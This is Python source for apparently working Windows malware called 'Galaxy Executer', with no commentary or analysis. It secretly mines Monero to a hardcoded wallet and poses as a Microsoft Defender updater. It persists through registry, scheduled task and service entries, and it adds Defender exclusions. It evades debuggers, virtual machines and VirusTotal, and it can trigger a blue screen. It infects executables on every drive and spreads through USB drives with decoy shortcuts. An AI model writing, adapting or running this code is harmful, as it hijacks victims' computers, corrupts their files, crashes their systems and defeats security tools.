


import os
import sys
import ctypes
import ctypes.wintypes
import time
import random
import subprocess
import json
import socket
import struct
import hashlib
import threading
import shutil
from pathlib import Path

# ---- HIDE CONSOLE ----
if sys.platform == 'win32':
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    ctypes.windll.kernel32.SetConsoleCtrlHandler(None, 1)

# ---- CONFIGURATION ----
WALLET = "4B66xaTYtP89ff99ceWkM1Xx1S6Qnk9NMb2gXYBJsMWxaVVfzhghA6i8LyDRYaq4sVgUw3BMnudRb7mZ24MpL1VgRMXLTQg"
POOL = "xmr-asia1.nanopool.org:14444"
PASSWORD = "x"

# ---- PATHS ----
def get_temp():
    return os.environ.get('TEMP', os.environ.get('TMP', 'C:\\Windows\\Temp'))

def get_appdata():
    return os.environ.get('APPDATA', os.path.expanduser('~\\AppData\\Roaming'))

def get_startup():
    return os.path.join(get_appdata(), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')

def exe_name():
    return "Microsoft Defender Updater Manager.exe"

def exe_path():
    return os.path.join(os.environ.get('PROGRAMDATA', 'C:\\ProgramData'), 'Microsoft\\Windows', exe_name())

# ---- PRIVILEGE HELPERS ----
def enable_privilege(privilege_name):
    try:
        import win32security, win32api, win32con
        hToken = win32security.OpenProcessToken(
            win32api.GetCurrentProcess(),
            win32con.TOKEN_ADJUST_PRIVILEGES | win32con.TOKEN_QUERY
        )
        luid = win32security.LookupPrivilegeValue(None, privilege_name)
        win32security.AdjustTokenPrivileges(hToken, False, [(luid, win32con.SE_PRIVILEGE_ENABLED)])
        win32api.CloseHandle(hToken)
        return True
    except:
        return False

# ---- REAL RANDOMX WRAPPER ----
try:
    import randomx
    RANDOMX_AVAILABLE = True
except ImportError:
    RANDOMX_AVAILABLE = False

class RandomXWrapper:
    def __init__(self):
        if not RANDOMX_AVAILABLE:
            raise RuntimeError("randomx module not installed. Run: pip install randomx")
        self.flags = randomx.get_flags()
        self.seed = os.urandom(32)
        self.cache = randomx.RandomXCache(self.flags, self.seed)
        self.vm = randomx.RandomXVM(self.flags, self.cache, None)

    def hash(self, input_data: bytes) -> bytes:
        if not isinstance(input_data, bytes):
            input_data = bytes(input_data)
        return self.vm.hash(input_data)

    def __del__(self):
        pass

class RandomXDll:
    def __init__(self, dll_path='randomx.dll'):
        self.dll = ctypes.CDLL(dll_path)
        self.flags = self.dll.randomx_get_flags()
        self.seed = os.urandom(32)
        self.dll.randomx_create_cache.restype = ctypes.c_void_p
        self.cache = self.dll.randomx_create_cache(self.flags, self.seed, len(self.seed))
        self.dll.randomx_create_vm.restype = ctypes.c_void_p
        self.vm = self.dll.randomx_create_vm(self.flags, self.cache, None)

    def hash(self, input_data: bytes) -> bytes:
        out = ctypes.create_string_buffer(32)
        self.dll.randomx_calculate_hash(self.vm, input_data, len(input_data), out)
        return out.raw

    def __del__(self):
        if hasattr(self, 'vm') and self.vm:
            self.dll.randomx_destroy_vm(self.vm)
        if hasattr(self, 'cache') and self.cache:
            self.dll.randomx_destroy_cache(self.cache)

# ---- MINER ----
class XMRMiner:
    def __init__(self):
        self.wallet = WALLET
        self.pool = POOL
        self.sock = None
        self.running = True
        self.job_id = None
        self.blob = None
        self.target = None
        self.hash_count = 0
        self.accepted = 0
        self.start_time = time.time()
        try:
            self.rx = RandomXWrapper()
        except:
            try:
                self.rx = RandomXDll('randomx.dll')
            except:
                self.rx = RandomXDll('randomx.dll')
        print(f"✅ RandomX initialized – mining to {self.wallet[:16]}...")

    def connect(self):
        try:
            host, port = self.pool.split(':')
            self.sock = socket.socket()
            self.sock.settimeout(10)
            self.sock.connect((host, int(port)))
            login = {
                "method": "login",
                "params": {"login": self.wallet, "pass": PASSWORD},
                "id": 1
            }
            self.sock.send((json.dumps(login)+'\n').encode())
            resp = json.loads(self.sock.recv(4096).decode())
            if resp.get('result'):
                job = resp['result']['job']
                self.job_id = job['job_id']
                self.blob = bytes.fromhex(job['blob'])
                self.target = int(job['target'], 16)
                print(f"✅ Connected to {self.pool}")
                return True
        except Exception as e:
            print(f"❌ Connect error: {e}")
            return False
        return False

    def mine(self):
        if not self.connect():
            print("❌ Failed to connect to pool")
            return
        nonce = 0
        print("⛏️ Mining started")
        while self.running:
            try:
                block = self.blob + struct.pack('<I', nonce)
                h = self.rx.hash(block)
                h_int = int.from_bytes(h, 'little')
                if h_int < self.target:
                    submit = {
                        "method": "submit",
                        "params": [self.wallet, self.job_id, 'x', hex(nonce)[2:].zfill(8)],
                        "id": 2
                    }
                    self.sock.send((json.dumps(submit)+'\n').encode())
                    self.accepted += 1
                    print(f"✅ Share accepted! Total: {self.accepted}")
                self.hash_count += 1
                nonce += 1
                if nonce >= 0xFFFFFFFF:
                    nonce = 0
                if is_task_manager_running():
                    time.sleep(0.05)
                elif is_user_idle():
                    time.sleep(0.001)
                else:
                    time.sleep(0.01)
            except Exception as e:
                print(f"Mining error: {e}")
                time.sleep(1)
                self.connect()

# ---- TASK MANAGER DETECTION ----
def is_task_manager_running():
    try:
        import psutil
        monitors = ['taskmgr.exe','procexp.exe','processhacker.exe','perfmon.exe','resmon.exe','procmon.exe']
        for proc in psutil.process_iter(['name']):
            try:
                name = proc.info['name'].lower()
                for m in monitors:
                    if m in name:
                        return True
            except:
                pass
    except:
        pass
    return False

# ---- IDLE DETECTION ----
def is_user_idle(threshold=15):
    try:
        class LASTINPUTINFO(ctypes.Structure):
            _fields_ = [("cbSize", ctypes.wintypes.UINT), ("dwTime", ctypes.wintypes.DWORD)]
        lii = LASTINPUTINFO()
        lii.cbSize = ctypes.sizeof(LASTINPUTINFO)
        ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii))
        current = ctypes.windll.kernel32.GetTickCount()
        return (current - lii.dwTime) / 1000 > threshold
    except:
        return False

# ---- PERSISTENCE ----
def install_persistence():
    try:
        import winreg
        key = winreg.HKEY_CURRENT_USER
        handle = winreg.OpenKey(key, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(handle, "GalaxyExecuter", 0, winreg.REG_SZ, exe_path())
        winreg.CloseKey(handle)
    except:
        pass
    try:
        subprocess.run(f'schtasks /create /tn "GalaxyExecuter" /tr "{exe_path()}" /sc onlogon /ru SYSTEM /rl HIGHEST /f', shell=True, capture_output=True)
    except:
        pass
    try:
        subprocess.run(f'sc create "GalaxyService" binPath= "{exe_path()}" start= auto', shell=True, capture_output=True)
    except:
        pass
    try:
        startup = get_startup()
        if os.path.exists(startup):
            link = os.path.join(startup, "Galaxy Executer.url")
            with open(link, 'w') as f:
                f.write(f"[InternetShortcut]\nURL=file:///{exe_path()}\n")
            ctypes.windll.kernel32.SetFileAttributesW(link, 0x06)
    except:
        pass

# ---- DEFENDER EXCLUSIONS ----
def add_defender_exclusion(path_or_process, typ="path"):
    try:
        if typ == "path":
            subprocess.run(f'powershell -Command "Add-MpPreference -ExclusionPath \'{path_or_process}\' -Force"', shell=True, capture_output=True)
        elif typ == "process":
            name = os.path.basename(path_or_process)
            subprocess.run(f'powershell -Command "Add-MpPreference -ExclusionProcess \'{name}\' -Force"', shell=True, capture_output=True)
        elif typ == "extension":
            subprocess.run(f'powershell -Command "Add-MpPreference -ExclusionExtension \'.exe\' -Force"', shell=True, capture_output=True)
    except:
        pass
    try:
        import winreg
        root = r"SOFTWARE\Microsoft\Windows Defender\Exclusions"
        if typ == 'path':
            subkey = "Paths"
            val_type = winreg.REG_DWORD
            value = 0
        elif typ == 'process':
            subkey = "Processes"
            val_type = winreg.REG_DWORD
            value = 0
        elif typ == 'extension':
            subkey = "Extensions"
            val_type = winreg.REG_SZ
            ext = '.' + path_or_process if not path_or_process.startswith('.') else path_or_process
            value = "0"
        else:
            return
        key_path = f"{root}\\{subkey}"
        handle = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
        if typ == 'extension':
            winreg.SetValueEx(handle, ext, 0, val_type, value)
        else:
            winreg.SetValueEx(handle, path_or_process, 0, val_type, value)
        winreg.CloseKey(handle)
    except:
        pass

def whitelist_all():
    for d in [get_temp(), get_appdata(), os.environ.get('USERPROFILE',''), os.environ.get('LOCALAPPDATA','')]:
        if os.path.exists(d):
            add_defender_exclusion(d, "path")
    add_defender_exclusion(exe_path(), "path")
    add_defender_exclusion(exe_name(), "process")
    add_defender_exclusion(".exe", "extension")

def defender_exclusion_watchdog():
    while True:
        whitelist_all()
        time.sleep(300)

# ---- ANTI-DEBUG ----
def is_debugger_present():
    try:
        ntdll = ctypes.WinDLL('ntdll')
        process = ctypes.windll.kernel32.GetCurrentProcess()
        debug_flag = ctypes.c_byte()
        ntdll.NtQueryInformationProcess(process, 0x1F, ctypes.byref(debug_flag), 1, None)
        if debug_flag.value != 0:
            return True
    except:
        pass
    if os.environ.get('_NT_DEBUG_PORT'):
        return True
    debug_procs = {
        'x64dbg.exe','x32dbg.exe','ida.exe','ollydbg.exe','windbg.exe',
        'processhacker.exe','procexp.exe','dnspy.exe','ilspy.exe',
        'de4dot.exe','ghidra.exe','cheatengine.exe','pestudio.exe',
        'autoruns.exe','procmon.exe','regshot.exe','apimonitor.exe'
    }
    try:
        import psutil
        for proc in psutil.process_iter(['name']):
            if proc.info['name'].lower() in debug_procs:
                return True
    except:
        pass
    return False

def check_debug_windows():
    debug_keywords = {'x32dbg','x64dbg','ida','ollydbg','wireshark','process hacker','dnspy','ilspy','de4dot','ghidra'}
    def enum_callback(hwnd, lParam):
        try:
            text = ctypes.windll.user32.GetWindowTextW(hwnd).lower()
            for kw in debug_keywords:
                if kw in text:
                    pid = ctypes.c_ulong()
                    ctypes.windll.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
                    if pid.value:
                        try:
                            import psutil
                            psutil.Process(pid.value).kill()
                        except:
                            pass
                    sys.exit(0)
        except:
            pass
        return True
    enum = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.c_void_p, ctypes.c_void_p)
    ctypes.windll.user32.EnumWindows(enum(enum_callback), 0)

def debug_watchdog():
    while True:
        if is_debugger_present():
            self_destruct()
            time.sleep(1)
            trigger_bsod()
        check_debug_windows()
        time.sleep(5)

# ---- ANTI-VM ----
def detect_vm():
    try:
        import psutil
        for p in ['VMwareService.exe','VBoxService.exe']:
            for proc in psutil.process_iter(['name']):
                try:
                    if proc.info['name'].lower() == p.lower():
                        sys.exit(0)
                except:
                    pass
    except:
        pass
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\Disk\Enum")
        val = winreg.QueryValueEx(key, '0')[0]
        winreg.CloseKey(key)
        if 'vmware' in val.lower() or 'vbox' in val.lower():
            sys.exit(0)
    except:
        pass
    for dll in ['vmGuestLib.dll','vboxmrxnp.dll']:
        if os.path.exists(os.path.join(os.environ.get('SystemRoot','C:\\Windows'), 'System32', dll)):
            sys.exit(0)
    try:
        import psutil
        mem = psutil.virtual_memory().total / (1024**3)
        if mem < 4: sys.exit(0)
        disk = psutil.disk_usage(os.environ.get('SystemDrive','C:') + '\\').total / (1024**3)
        if disk < 50: sys.exit(0)
        if psutil.cpu_count() < 2: sys.exit(0)
    except:
        pass

# ---- IP BLACKLIST ----
def check_ip_blacklist():
    blacklist = {'88.132.227.238','79.104.209.33','92.211.52.62','20.99.160.173'}
    try:
        import urllib.request
        ip = urllib.request.urlopen('https://api64.ipify.org/', timeout=5).read().decode()
        if ip in blacklist:
            sys.exit(0)
    except:
        pass

# ---- VIRUSTOTAL DNS KILL SWITCH ----
def check_virustotal_dns():
    try:
        result = subprocess.run('ipconfig /displaydns', shell=True, capture_output=True, text=True)
        return 'virustotal' in result.stdout.lower()
    except:
        return False

def self_destruct():
    try:
        import psutil
        for proc in psutil.process_iter(['name']):
            try:
                if 'galaxy' in proc.info['name'].lower() or 'defender updater' in proc.info['name'].lower():
                    proc.kill()
            except:
                pass
    except:
        pass
    for f in [exe_path(), os.path.join(get_temp(), 'explorer_starter.bat'), os.path.join(get_startup(), 'Galaxy Executer.url')]:
        try:
            if os.path.exists(f): os.remove(f)
        except:
            pass
    try:
        import winreg
        key = winreg.HKEY_CURRENT_USER
        handle = winreg.OpenKey(key, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(handle, "GalaxyExecuter")
        winreg.CloseKey(handle)
    except:
        pass
    subprocess.run('schtasks /delete /tn "GalaxyExecuter" /f', shell=True, capture_output=True)
    subprocess.run('sc delete "GalaxyService"', shell=True, capture_output=True)

def virustotal_watchdog():
    while True:
        if check_virustotal_dns():
            self_destruct()
            time.sleep(1)
            trigger_bsod()
        time.sleep(5)

# ---- BSOD TRIGGER ----
def trigger_bsod():
    if enable_privilege('SeShutdownPrivilege'):
        try:
            ntdll = ctypes.WinDLL('ntdll')
            ntdll.NtRaiseHardError.argtypes = [ctypes.c_ulong, ctypes.c_ulong, ctypes.c_ulong, ctypes.c_void_p, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)]
            response = ctypes.c_ulong()
            ntdll.NtRaiseHardError(0xC0000420, 0, 0, None, 6, ctypes.byref(response))
        except:
            try:
                class SYSTEM_SHUTDOWN(ctypes.Structure):
                    _fields_ = [('Shutdown', ctypes.c_ulong)]
                info = SYSTEM_SHUTDOWN(1)
                ntdll.NtSetSystemInformation(0x53, ctypes.byref(info), ctypes.sizeof(info))
            except:
                pass
    else:
        try:
            import psutil
            for proc in psutil.process_iter(['name']):
                if proc.info['name'].lower() in ['csrss.exe', 'winlogon.exe']:
                    proc.kill()
        except:
            pass

# ---- FILE INFECTION ----
def infect_file(file_path):
    try:
        import pefile
        pe = pefile.PE(file_path)
        if pe.OVERLAY_DATA and b'GALAXY' in pe.OVERLAY_DATA:
            return False
        payload = b'powershell -WindowStyle Hidden -Command "Start-Process \\"%s\\" -WindowStyle Hidden"' % exe_path().encode()
        key = 0x5A
        encrypted = bytes([b ^ key for b in payload])
        pe.add_section(name='.galax', data=encrypted, characteristics=0x20000000 | 0x00000020)
        pe.OPTIONAL_HEADER.AddressOfEntryPoint = pe.sections[-1].VirtualAddress
        pe.write(file_path)
        add_defender_exclusion(file_path, "path")
        add_defender_exclusion(os.path.basename(file_path), "process")
        return True
    except:
        return False

def scan_and_infect():
    exts = ('.exe','.dll','.scr','.com','.bat','.cmd')
    excluded = ('C:\\Windows','C:\\Program Files','C:\\Program Files (x86)','C:\\System Volume Information')
    for drive in [chr(i)+':\\' for i in range(ord('A'), ord('Z')+1)]:
        if os.path.exists(drive):
            for root, dirs, files in os.walk(drive):
                if any(root.startswith(e) for e in excluded):
                    continue
                for f in files:
                    if f.lower().endswith(exts) and not f.lower().startswith('galaxy'):
                        infect_file(os.path.join(root, f))
                        time.sleep(0.3)

def infection_watchdog():
    while True:
        scan_and_infect()
        time.sleep(300)

# ---- USB SPREAD ----
def set_usb_autoplay(drive_letter):
    try:
        import winreg
        key = winreg.HKEY_CURRENT_USER
        handler_path = r"Software\Microsoft\Windows\CurrentVersion\Explorer\AutoplayHandlers\Handlers\GalaxyHandler"
        handle = winreg.CreateKey(key, handler_path)
        winreg.SetValueEx(handle, "Action", 0, winreg.REG_SZ, "Run Galaxy Executer")
        winreg.SetValueEx(handle, "InvokeProgID", 0, winreg.REG_SZ, "GalaxyExecuter")
        winreg.SetValueEx(handle, "InvokeVerb", 0, winreg.REG_SZ, "open")
        winreg.SetValueEx(handle, "Provider", 0, winreg.REG_SZ, "Galaxy")
        winreg.SetValueEx(handle, "DefaultIcon", 0, winreg.REG_SZ, exe_path())
        winreg.CloseKey(handle)
        assoc_path = f"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoplayHandlers\\UserChosenExecuteHandlers\\{drive_letter[:-1]}"
        handle = winreg.CreateKey(key, assoc_path)
        winreg.SetValueEx(handle, "Handler", 0, winreg.REG_SZ, "GalaxyHandler")
        winreg.CloseKey(handle)
    except:
        pass

def monitor_usb():
    existing = set()
    while True:
        current = set()
        for d in [chr(i)+':\\' for i in range(ord('A'), ord('Z')+1)]:
            if os.path.exists(d) and ctypes.windll.kernel32.GetDriveTypeW(d) == 2:
                current.add(d)
        new = current - existing
        for d in new:
            target = os.path.join(d, exe_name())
            if not os.path.exists(target):
                shutil.copy2(exe_path(), target)
                ctypes.windll.kernel32.SetFileAttributesW(target, 0x06)
            set_usb_autoplay(d)
            try:
                import win32com.client
                shell = win32com.client.Dispatch("WScript.Shell")
                shortcut = shell.CreateShortCut(os.path.join(d, "Important_Documents.lnk"))
                shortcut.Targetpath = target
                shortcut.WorkingDirectory = d
                shortcut.save()
            except:
                pass
            for root, _, files in os.walk(d):
                for f in files:
                    if f.lower().endswith(('.exe','.dll','.scr')):
                        infect_file(os.path.join(root, f))
        existing = current
        time.sleep(2)

# ---- MAIN ----
def main():
    try:
        import win32event, win32api, winerror
        mutex = win32event.CreateMutex(None, False, "GalaxyExecuter")
        if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
            sys.exit(0)
    except:
        pass

    print("=== GALAXY EXECUTER ===")
    print(f"🚀 Mining to wallet: {WALLET[:16]}...{WALLET[-8:]}")
    print(f"🌐 Pool: {POOL}")

    threading.Thread(target=debug_watchdog, daemon=True).start()
    detect_vm()
    check_ip_blacklist()
    threading.Thread(target=virustotal_watchdog, daemon=True).start()

    whitelist_all()
    threading.Thread(target=defender_exclusion_watchdog, daemon=True).start()
    install_persistence()

    miner = XMRMiner()
    threading.Thread(target=miner.mine, daemon=True).start()

    threading.Thread(target=infection_watchdog, daemon=True).start()
    threading.Thread(target=monitor_usb, daemon=True).start()

    while True:
        time.sleep(3600)

if __name__ == '__main__':
    main()